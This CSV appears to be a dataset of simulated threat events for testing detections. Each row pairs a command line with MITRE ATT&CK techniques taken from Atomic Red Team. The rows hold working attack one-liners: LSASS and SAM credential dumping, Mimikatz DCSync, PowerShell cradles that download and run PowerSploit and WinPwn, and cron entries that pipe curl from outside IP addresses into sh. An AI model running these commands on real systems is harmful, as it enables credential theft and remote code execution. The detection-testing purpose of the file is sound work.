id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
PROC-TE-41,Threat Event,TRUE,WKS41,Dump LSASS.exe Memory using Out-Minidump.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory C:\Users\joebob\ART\ExternalPayloads\ -ErrorAction Ignore -Force | Out-Null try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop} catch{ $_; exit $_.Exception.Response.StatusCode.Value__} get-process lsass | Out-Minidump,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-42,Threat Event,TRUE,WKS42,Offline Credential Theft With Mimikatz (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,"C:\Users\joebob\Documents\onedrive.exe ""sekurlsa::minidump %tmp%\lss.DMP"" ""sekurlsa::logonpasswords full"" exit","Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-43,Threat Event,TRUE,WKS43,Powershell Mimikatz Cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-44,Threat Event,TRUE,WKS44,Registry dumping via reg.exe (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\sam %temp%\sam,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-45,Threat Event,TRUE,WKS45,Registry dumping via reg.exe (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\system %temp%\system,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-46,Threat Event,TRUE,WKS46,Registry dumping via reg.exe (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\security %temp%\security,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-47,Threat Event,TRUE,WKS47,esentutl.exe SAM copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\esentutl.exe,esentutl.exe,C:\Windows\System32\esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-48,Threat Event,TRUE,WKS48,Dump volume shadow copy hives with certutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*","Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-49,Threat Event,TRUE,WKS49,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') samfile -consoleoutput -noninteractive,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-50,Threat Event,TRUE,WKS50,Dumping of SAM creds and secrets via Reg Export (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\sam %temp%\sam,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-51,Threat Event,TRUE,WKS51,Dumping of SAM creds and secrets via Reg Export (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\system %temp%\system,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-52,Threat Event,TRUE,WKS52,Dumping of SAM creds and secrets via Reg Export (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\security %temp%\security,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-53,Threat Event,TRUE,WKS53,Create Volume Shadow Copy with vssadmin (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-54,Threat Event,TRUE,WKS54,Dump Active Directory Database with NTDSUtil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\ntdsutil.exe,ntdsutil.exe,"C:\Windows\System32\ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\out"" q q","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-55,Threat Event,TRUE,WKS55,Create Volume Shadow Copy with WMI (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wmic.exe,wmic.exe,C:\Windows\System32\wmic.exe shadowcopy call create Volume=C:\,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-56,Threat Event,TRUE,WKS56,Create Volume Shadow Copy with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-57,Threat Event,TRUE,WKS57,Create Symlink to Volume Shadow Copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C:\ && mklink /D C:\Temp\vssstore \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-58,Threat Event,TRUE,WKS58,Create Volume Shadow Copy with diskshadow (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\diskshadow.exe,diskshadow.exe,C:\Windows\System32\diskshadow.exe /s C:\Windows\Temp\T1003.003\src\diskshadow.txt,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-59,Threat Event,TRUE,WKS59,Dump Kerberos Tickets from LSA using dumper.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1'),"Credential Access
Execution","OS Credential Dumping: LSA Secrets
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md,
PROC-TE-60,Threat Event,TRUE,WKS60,DCSync - Active Directory (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\Public\onedrive.exe,onedrive.exe,"C:\Windows\Public\onedrive.exe ""lsadump::dcsync /domain:example.com /user:joebob@example.com"" ""exit""","Credential Access
Execution","OS Credential Dumping: DCSync
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md,
PROC-TE-61,Threat Event,TRUE,WKS61,Adfind Enumerate Active Directory Domain Controller Objects (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\Public\AdFind.exe,AdFind.exe,C:\Users\Public\AdFind.exe -sc dclist,"Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-62,Threat Event,TRUE,WKS62,Enumerate Active Directory Computers with Get-AdComputer (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Get-AdComputer -Filter *,"Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-63,Threat Event,TRUE,WKS63,Enumerate Active Directory Computers with ADSISearcher (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe ([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-64,Threat Event,TRUE,WKS64,Get-DomainController with PowerView (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-65,Threat Event,TRUE,WKS65,Get-WmiObject to Enumerate Domain Controllers (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $_; exit $_.Exception.HResult }","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-66,Threat Event,TRUE,WKS66,Remote System Discovery - net group Domain Controller (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"C:\Windows\System32\net.exe group /domain ""Domain controllers""","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-67,Threat Event,TRUE,WKS67,Masquerading as Windows LSASS process (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe,"Defense Evasion
Execution","Masquerading: Rename System Utilities
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
PROC-TE-68,Threat Event,TRUE,WKS68,File Extension Masquerading (Atomic Red Team),C:\Windows\System32\explorer.exe,C:\Users\joebob\AppData\Local\Temp\T1036.007\masquerading.pdf.exe,masquerading.pdf.exe,%temp%\T1036.007\masquerading.pdf.exe,Defense Evasion,Masquerading: Rename System Utilities,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md,
PROC-TE-69,Threat Event,TRUE,WKS69,Copy a sensitive File over Administrative share with copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe copy \\\\192.168.4.19\C$\Windows\Temp\credentials.txt %TEMP%\credentials.txt,"Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
PROC-TE-70,Threat Event,TRUE,WKS70,Copy a sensitive File over Administrative share with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe copy-item -Path ""\\\\192.168.4.19\C$\Windows\Temp\credentials.txt"" -Destination ""$Env:TEMP\credentials.txt""","Collection
Execution","Data from Network Shared Drive
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1039/T1039.md,
PROC-TE-71,Threat Event,TRUE,WKS71,Add hourly cron job (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl 193.19.194.14/jsgyt | sh"" > /etc/cron.hourly/persistme","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-72,Threat Event,TRUE,WKS72,Add cron job to cron.d directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo '*/5 * * * * root ""curl 193.19.194.14/jsgyt | sh""' > /etc/cron.d/persistme","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-73,Threat Event,TRUE,WKS73,Add cron job via crontab command (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""* * * * * /tmp/a.sh"" > /tmp/b.sh && crontab /tmp/b.sh","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-74,Threat Event,TRUE,WKS74,Add cron job to /var/spool/cron/crontabs/ directory (Atomic Red Team),/bin/bash,/bin/bash,bash,"/bin/bash echo ""curl http://193.176.183.245/ahdytg | sh"" >> /var/spool/cron/crontabs/c","Persistence
Execution","Scheduled Task/Job: Cron
Command and Scripting Interpreter: Unix Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md,
PROC-TE-75,Threat Event,TRUE,WKS75,Add startup script via schtasks.exe (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\schtasks.exe,schtasks.exe,"C:\Windows\System32\schtasks.exe /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""","Persistence
Execution","Scheduled Task/Job: Scheduled Task
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md,
